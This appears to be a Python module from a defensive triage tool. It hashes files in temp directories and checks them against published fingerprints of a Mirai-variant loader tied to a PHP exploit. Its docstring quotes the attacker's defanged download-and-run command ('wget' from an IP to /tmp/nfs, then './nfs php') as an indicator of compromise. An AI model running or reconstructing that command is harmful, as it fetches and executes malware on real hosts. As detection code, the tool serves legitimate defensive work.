"""DRIFT CHECK (triage): hash files in tmpdirectories and compare against the
binary fingerprints published in the research briefs — the Potassium
(Mirai-variant) loader that the weaponized PHP2Shell PoC dropped as
`wget hxxp://92.118.112[.]100/nfs` -> /tmp/nfs, run as `./nfs php`, plus the
three additional payload hashes ELLIO published from its own sensors.

Rules encoded here:
- LOCAL FILE READS ONLY. This check never opens a socket. (Nothing anywhere in
  this tool performs network access.)
- Output never claims attribution. Hash hits are reported as "documented
  Mirai-variant loader fingerprint / documented payload fingerprint, see
  references" — the briefs are explicit that no actor attribution exists and
  that the Potassium association is payload infrastructure, not an operator.
"""

import hashlib
import os
import sys
from typing import Iterable, Optional

from . import fingerprints
from .report import finding

# default tmpdirs for the drift walk (fingerprints is the fact base)
DEFAULT_TMPDIRS = fingerprints.DEFAULT_TMPDIRS

CHUNK = 1024 * 256
SKIP_SIZE = 512 * 1024 * 1024  # do not hash files larger than 512 MiB (loader is 179,632 B)


def all_fingerprints() -> list:
    fps = [dict(fingerprints.POTASSIUM_LOADER)]
    fps.extend(dict(f) for f in fingerprints.ELLIIO_EXTRA_PAYLOADS)
    return fps


def _digest_file(path: str, size: int):
    md5, sha1, sha256 = hashlib.md5(), hashlib.sha1(), hashlib.sha256()
    read = 0
    try:
        with open(path, "rb") as fh:
            while True:
                chunk = fh.read(CHUNK)
                if not chunk:
                    break
                md5.update(chunk)
                sha1.update(chunk)
                sha256.update(chunk)
                read += len(chunk)
    except OSError:
        return None
    if read != size:
        size = read  # race: file changed while hashing; use what we read
    return {"md5": md5.hexdigest(), "sha1": sha1.hexdigest(),
            "sha256": sha256.hexdigest(), "size": size}


# The loader drops to /tmp as "nfs" (and the Sophos-observed variant fetched
# .../nfs-setup); only hash *content* decides a hit — presence of these names is
# info-only.
DROP_NAMES = ("nfs", "nfs-setup")


def scan(paths: Optional[Iterable[str]] = None, fps: Optional[list] = None) -> dict:
    if fps is None:
        fps = all_fingerprints()
    requested = list(paths) if paths is not None else list(fingerprints.DEFAULT_TMPDIRS)

    dedup, missing = [], []
    for p in requested:
        if not p:
            continue
        try:
            real = os.path.realpath(p)
        except OSError:
            real = p
        if os.path.isdir(real):
            if real not in dedup:
                dedup.append(real)
        else:
            missing.append(p)

    findings, files_hashed, skipped_large, fs_errors, matched_any = [], 0, 0, 0, False
    seen_names = set()
    for root in dedup:
        for dirpath, _dirnames, filenames in os.walk(root):
            for fn in filenames:
                p = os.path.join(dirpath, fn)
                if os.path.islink(p):
                    continue
                try:
                    st = os.stat(p)
                except OSError:
                    fs_errors += 1
                    continue
                if st.st_size > SKIP_SIZE:
                    skipped_large += 1
                    continue
                dig = _digest_file(p, st.st_size)
                if dig is None:
                    fs_errors += 1
                    continue
                files_hashed += 1
                if fn in DROP_NAMES:
                    seen_names.add(p)
                hit_fs = None
                for f in fps:
                    if any(dig[a] == (f.get(a) or "").lower()
                           for a in ("md5", "sha1", "sha256") if f.get(a)):
                        hit_fs = f
                        break
                if hit_fs is not None:
                    matched_any = True
                    findings.append(finding(
                        "DRIFT_HASH_MATCH", "critical",
                        f"FILE {p} ({dig['size']} B) hashes match a documented payload fingerprint: "
                        f"{hit_fs['label']}. LOCAL FILE HASH MATCH ONLY — treat as suspected incident "
                        f"(documented loader drop path /tmp/nfs, executed as './nfs php'); see references; "
                        f"no attribution implied by this tool.",
                        check="drift", file=p,
                        evidence=f"md5={dig['md5']} sha256={dig['sha256']} size={dig['size']} "
                                 f"(documented size: {hit_fs.get('size_bytes')}) "
                                 f"(declared label: {hit_fs['label']})",
                        basis=f"VERBATIM hashes: {hit_fs.get('source')}",
                        related=["109618", "109619"]))

    # name-only presence info for the documented drop paths
    for p in sorted(seen_names):
        if not matched_at(findings, p):
            findings.append(finding(
                "DRIFT_DROP_PATH_PRESENT", "info",
                f"file named '{os.path.basename(p)}' present in tmpdir — documented loader "
                f"drop/execution name (Sophos IOC table: /tmp/nfs run as './nfs php'); "
                f"verify by hashing (no hash match registered here)",
                check="drift", file=p,
                evidence=f"presence of {p} (no documented hash matched)",
                basis="VERBATIM name: /tmp/nfs (+ variant fetch .../nfs-setup) - "
                      "technique.md 10.1, tracker.md 4.3"))
    for p, why in fingerprints.PROBE_PATHS:
        if os.path.exists(p) and not matched_at(findings, p):
            findings.append(finding(
                "DRIFT_PROBE_PATH_PRESENT", "info",
                f"documented payload probe path present on this host: {p} ({why})",
                check="drift", file=p, basis=why))

    return {
        "paths_used": dedup,
        "paths_missing": sorted(set(missing)),
        "files_hashed": files_hashed,
        "skipped_large": skipped_large,
        "fs_errors": fs_errors,
        "findings": findings,
        "networked": False,
    }


def matched_at(findings: list, path: str) -> bool:
    for f in findings:
        if f.get("file") == path and f.get("rule") == "DRIFT_HASH_MATCH":
            return True
    return False